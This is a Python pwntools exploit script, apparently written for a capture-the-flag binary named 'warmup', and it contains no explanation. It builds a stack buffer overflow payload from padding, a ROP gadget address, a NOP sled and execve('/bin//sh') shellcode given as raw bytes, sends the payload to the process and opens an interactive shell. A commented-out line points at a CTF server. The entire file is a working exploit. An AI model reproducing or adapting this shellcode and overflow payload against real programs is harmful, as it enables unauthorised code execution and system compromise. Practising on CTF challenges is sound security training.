from pwn import*
context.terminal = ['tmux','splitw','-h']

#p = remote('nothing.chal.ctf.westerns.tokyo','10001')
p = process('./warmup')
#gdb.attach(proc.pidof(p)[0])


pop_rdi = p64(0x0000000000400773)
#pop_rsi_r15 = p64(0x0000000000400771)


#shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"



padding = 256 * "A"
rbp = "B" * 8 
rip = 0x00007fff14f8f990
rip = 0x7fffffffe290 +45
nopsled = "\x90" * 50  
payload =  (padding + rbp + p64(0x0000000000400772) + nopsled + shellcode)

#print p64(rip)
#print payload 
p.recvuntil("Please pwn me :)")
p.sendline(payload)  
#p.sendline(sc + padding + payload)
p.interactive()
